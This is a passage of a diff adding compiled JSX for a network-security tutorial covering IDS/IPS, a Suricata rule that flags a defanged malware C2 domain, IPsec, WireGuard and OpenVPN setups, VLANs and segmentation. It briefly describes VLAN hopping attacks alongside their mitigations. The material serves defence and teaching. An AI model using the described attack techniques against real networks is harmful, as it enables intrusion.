+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Latency"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Zero added latency"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "1-5ms added latency (inline processing)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Failure Mode"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Failure = lost visibility"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Failure = traffic blocked (fail-close) or bypassed (fail-open)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Detection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Same signature/anomaly engines"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Same engines + blocking capability"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Use Case"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Forensics, compliance monitoring"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Active threat prevention"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Bypass Risk"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Limited (traffic already passed)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High (inline break affects all traffic)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Management"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Tune alerts, reduce false positives"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Balance false positives vs preventable attacks"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Decision Tree: IDS vs IPS Deployment"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Do you need to block attacks in real time?\n├── Yes → Can your rules handle false positives?\n│   ├── Yes → Deploy IPS (inline)\n│   └── No → Deploy IDS first, tune rules, then IPS\n└── No → Deploy IDS (passive monitoring)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "36-hids-vs-nids",
+      children: "3.6 HIDS vs NIDS"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Aspect"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "NIDS (Network IDS)"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "HIDS (Host IDS)"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Monitoring Scope"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Network segment"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Single host"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Data Source"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Packets, flows"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Logs, file integrity, syscalls"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Detection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Protocol anomalies, malware C2"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "File changes, privilege escalation"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Example Tools"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Snort, Suricata, Zeek"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OSSEC, Wazuh, Tripwire"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Visibility"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All traffic on segment"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All host activity"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Blind Spots"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Encrypted traffic"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Network-level attacks"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "37-snortsuricata--live-detection-dry-run",
+      children: "3.7 Snort/Suricata → Live Detection Dry Run"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Scenario: A machine on the internal network attempts to connect to a known malware C2 domain (winmalware[.]xyz) on port 443."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "1. Packet arrives at Suricata interface\n2. Suricata parses TLS ClientHello → extracts SNI field: \"winmalware[.]xyz\"\n3. Suricata matches rule:\n   alert tls $HOME_NET any -> $EXTERNAL_NET any\n     (msg:\"Known Malware C2 Domain\";\n      tls.sni; content:\"winmalware.xyz\"; nocase;\n      sid:3000001; rev:1;)\n4. Event logged to /var/log/suricata/eve.json:\n   {\n     \"event_type\": \"alert\",\n     \"alert\": {\n       \"action\": \"allowed\",\n       \"signature_id\": 3000001,\n       \"signature\": \"Known Malware C2 Domain\",\n       \"category\": \"Unknown Traffic\"\n     },\n     \"tls\": {\n       \"sni\": \"winmalware[.]xyz\"\n     },\n     \"src_ip\": \"192.168.1.100\",\n     \"dest_ip\": \"10.20.30.40\",\n     \"proto\": \"TCP\"\n   }\n5. If inline (IPS mode): Suricata sends TCP RST to both sides → connection blocked\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-4-virtual-private-networks-vpns",
+      children: "Section 4: Virtual Private Networks (VPNs)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "41-overview",
+      children: "4.1 Overview"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "A VPN creates an encrypted tunnel between two endpoints over an untrusted network (the internet). It provides:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Confidentiality:"
+        }), " Encryption prevents eavesdropping"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Integrity:"
+        }), " HMAC ensures data not tampered"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Authentication:"
+        }), " Verifies both endpoints"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Access Control:"
+        }), " Restricts which resources are reachable"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Real-World Analogy:"
+      }), " A VPN is like an armored tunnel through a dangerous neighborhood. You enter at your house, travel through the armored tunnel, and emerge inside your office. People outside cannot see what you're carrying or where you're going."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "42-vpn-types",
+      children: "4.2 VPN Types"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Site-to-Site VPN:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Connects entire networks (e.g., branch office to HQ)."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[Branch Office: 10.1.0.0/16]\n     |\n [VPN Gateway A] =====encrypted tunnel===== [VPN Gateway B]\n     |\n[Headquarters: 10.0.0.0/16]\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Remote Access VPN:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Individual users connect to corporate network."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[User Laptop] ---internet--- [VPN Gateway] --- [Corporate Network]\n    ^                           ^\n   VPN Client              VPN Server (OpenVPN, WireGuard)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "43-ipsec-vpn",
+      children: "4.3 IPsec VPN"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "IPsec operates at Layer 3"
+      }), " and can encrypt any IP traffic (not just TCP/UDP)."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Modes:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Transport Mode:"
+        }), " Encrypts only payload (original IP header visible) → used for end-to-end"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tunnel Mode:"
+        }), " Encrypts entire packet, wraps in new IP header → used for site-to-site"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "IPsec Protocol Stack:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "| IP Header | ESP Header | Original IP Header | TCP Header | Payload | ESP Trailer | ESP Auth |\n| (new)     |            | (encrypted)                                       |            |          |\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Internet Key Exchange (IKE) Process:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "IKE Phase 1 (Main Mode):\nStep 1: Initiator sends SA proposal (encryption, hash, DH group)\nStep 2: Responder selects matching SA\nStep 3: DH key exchange → shared secret\nStep 4: Authentication (PSK or certificates)\nResult: ISAKMP SA (IKE SAs) → secure channel for negotiation\n\nIKE Phase 2 (Quick Mode):\nStep 1: Negotiate IPsec SA parameters (ESP/AH, crypto, SPI)\nStep 2: Generate session keys from Phase 1 keying material\nStep 3: Install IPsec SAs in kernel\nResult: ESP/AH SAs → secure tunnel for data\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "StrongSwan Configuration (Site-to-Site):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "# /etc/ipsec.conf\nconn site-to-site\n    type=tunnel\n    auto=start\n    left=203.0.113.1\n    leftsubnet=10.1.0.0/16\n    leftid=@branch-office\n    right=198.51.100.1\n    rightsubnet=10.0.0.0/16\n    rightid=@headquarters\n    ike=aes256-sha256-modp2048\n    esp=aes256-sha256-modp2048\n    keyexchange=ikev2\n    ikelifetime=8h\n    lifetime=1h\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Check IPsec status:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Show active IPsec SAs\nipsec statusall\n\n# Expected output:\n# Connections:\n# site-to-site:  %any...198.51.100.1  IKEv2\n# site-to-site:   local: [branch-office] uses pre-shared key\n# site-to-site:   remote: [headquarters] uses pre-shared key\n# site-to-site:   child: 10.1.0.0/16 === 10.0.0.0/16\n# Security Associations (1 up, 0 connecting):\n#   site-to-site[1]: ESTABLISHED 47 minutes ago\n#   site-to-site[1]: {1028} 10.1.0.0/16 === 10.0.0.0/16\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "44-wireguard-vpn",
+      children: "4.4 WireGuard VPN"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "WireGuard"
+      }), " is a modern, high-performance VPN protocol. Key design principles:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Minimal codebase (~4,000 lines vs ~400,000 for OpenVPN+IPsec)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Uses modern cryptography (Curve25519, ChaCha20, Poly1305, BLAKE2s, HKDF)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Built-in DoS mitigation and roaming"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Kernel integration (Linux 5.6+)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "WireGuard Configuration:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-ini",
+        children: "# /etc/wireguard/wg0.conf\n[Interface]\nAddress = 10.0.0.1/24\nPrivateKey = gNTRs...server-private-key...\nListenPort = 51820\n\n[Peer]\nPublicKey = xTIBA...client-public-key...\nAllowedIPs = 10.0.0.2/32\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-ini",
+        children: "# /etc/wireguard/wg0-client.conf\n[Interface]\nAddress = 10.0.0.2/24\nPrivateKey = +I0cX...client-private-key...\n\n[Peer]\nPublicKey = /yN8G...server-public-key...\nEndpoint = vpn.example.com:51820\nAllowedIPs = 10.0.0.0/24, 10.10.0.0/16\nPersistentKeepalive = 25\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "WireGuard tunnel state verification:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Show tunnel status\nwg show\n\n# Expected output:\n# interface: wg0\n#   public key: /yN8G...\n#   private key: (hidden)\n#   listening port: 51820\n#\n# peer: xTIBA...\n#   endpoint: 203.0.113.5:51820\n#   allowed ips: 10.0.0.2/32\n#   latest handshake: 1 minute, 30 seconds ago\n#   transfer: 42.5 KiB received, 128.3 KiB sent\n\n# Show quick statistics\nwg show wg0 transfer\n\n# Expected output: 128.3 KiB received, 42.5 KiB sent\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "45-openvpn-setup",
+      children: "4.5 OpenVPN Setup"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Install OpenVPN\napt install openvpn easy-rsa\n\n# Initialize PKI\nmake-cadir ~/openvpn-ca\ncd ~/openvpn-ca\n./easyrsa init-pki\n./easyrsa build-ca\n./easyrsa gen-req server nopass\n./easyrsa sign-req server server\n./easyrsa gen-dh\nopenvpn --genkey secret ta.key\n\n# Server config (/etc/openvpn/server.conf)\nport 1194\nproto udp\ndev tun\nca ca.crt\ncert server.crt\nkey server.key\ndh dh.pem\ntls-auth ta.key 0\nserver 10.8.0.0 255.255.255.0\npush \"route 192.168.1.0 255.255.255.0\"\nkeepalive 10 120\ncipher AES-256-GCM\nauth SHA256\nuser nobody\ngroup nogroup\nstatus openvpn-status.log\nverb 3\n\n# Start server\nsystemctl start openvpn@server\nsystemctl enable openvpn@server\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "46-ipsec-vs-wireguard-vs-openvpn-comparison",
+      children: "4.6 IPsec vs WireGuard vs OpenVPN Comparison"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Feature"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "IPsec (IKEv2)"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WireGuard"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "OpenVPN"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Code Size"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~400K lines"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~4K lines"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~150K lines"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Crypto Agility"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Multiple options (complex)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Fixed (Curve25519+ChaCha20)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Multiple options"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Handshake"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IKEv2 (2-4 round trips)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "1-RTT (single round trip)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS (2-3 round trips)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Latency"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Higher (negotiation overhead)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Minimal"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Moderate"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Throughput"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "500-800 Mbps (AES-NI)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "1-2 Gbps"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "300-600 Mbps"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NAT Traversal"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IKEv2 MOBIKE support"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Built-in roaming"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Requires keepalive"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Kernel Integration"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (strongSwan/libreswan)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (Linux 5.6+)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No (tun device)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Configuration Complexity"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "DoS Protection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Cookie mechanism"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DoS-resistant by design"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS DDoS vulnerable"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Perfect Forward Secrecy"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (DH)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (Ephemeral keys)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (DHE)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Auditability"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low (too complex)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High (minimal code)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Mobile Support"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "MOBIKE (some devices)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Excellent (roaming)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Good (TCP fallback)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Use Case"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enterprise site-to-site"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance-critical, mobile"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Compatibility, all platforms"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-5-network-segmentation",
+      children: "Section 5: Network Segmentation"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "51-overview",
+      children: "5.1 Overview"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Network segmentation divides a network into smaller logical or physical segments to:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Contain breaches (limit lateral movement)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Isolate sensitive systems"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Improve performance (reduce broadcast domains)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Simplify compliance (PCI DSS, HIPAA scoping)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Real-World Analogy:"
+      }), " Network segmentation is like a ship with watertight compartments. If one compartment floods (breach), the ship stays afloat because the water does not spread to other compartments."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "52-vlans-virtual-lans",
+      children: "5.2 VLANs (Virtual LANs)"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "How it works:"
+      }), " VLANs segment a switched network at Layer 2 without requiring separate physical switches."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Switch Configuration:\nVLAN 10 → Management     (10.0.10.0/24)\nVLAN 20 → Users          (10.0.20.0/24)\nVLAN 30 → Servers        (10.0.30.0/24)\nVLAN 40 → DMZ            (10.0.40.0/24)\nVLAN 99 → Native/Untagged\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "VLAN hopping attacks:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Switch Spoofing:"
+        }), " Attacker emulates DTP (Dynamic Trunking Protocol) to negotiate trunk link"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Double Tagging:"
+        }), " Attacker sends 802.1Q frame with two VLAN tags"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Mitigation:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Disable DTP on access ports\nswitchport mode access\nswitchport nonegotiate\n\n# Set native VLAN to unused VLAN\nswitchport trunk native vlan 999\n\n# Disable unused ports\nshutdown\n\n# Apply VLAN ACLs (VACL)\nvlan access-map BLOCK-VLAN20 10\n  match ip address BLOCK-ACL\n  action drop\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "53-dmz-demilitarized-zone",
+      children: "5.3 DMZ (Demilitarized Zone)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "A DMZ is a buffer network between the internet and internal network. Public-facing servers (web, email, DNS) are placed in the DMZ."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[Internet] --- [External FW] --- [DMZ] --- [Internal FW] --- [Internal Network]\n                                    |\n                              Web Server\n                              Mail Server\n                              DNS Server\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Traffic Flow Rules:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "External → DMZ: Allow HTTP/HTTPS to web server (port 80, 443)\nExternal → Internal: Deny all\nDMZ → Internal: Allow specific (e.g., DB queries on port 3306)\nInternal → DMZ: Allow management (SSH, RDP)\nDMZ → Internet: Allow updates (apt, yum)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "54-micro-segmentation",
+      children: "5.4 Micro-Segmentation"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "How it works:"
+      }), " Further divides segments into per-workload or per-application security zones, typically using:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Software-defined networking (SDN)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Host-based firewalls (e.g., iptables on each container)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Service mesh (e.g., Istio for Kubernetes)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Zero Trust Micro-Segmentation Example (Kubernetes Network Policy):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-yaml",
+        children: "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: api-db-policy\nspec:\n  podSelector:\n    matchLabels:\n      app: database\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: api-server\n    ports:\n    - protocol: TCP\n      port: 5432\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: ["This ensures ONLY pods labeled ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "api-server"
+      }), " can connect to ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "database"
+      }), " pods on port 5432 → all other traffic is blocked."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Advantages & Disadvantages of Micro-Segmentation:"
+      })
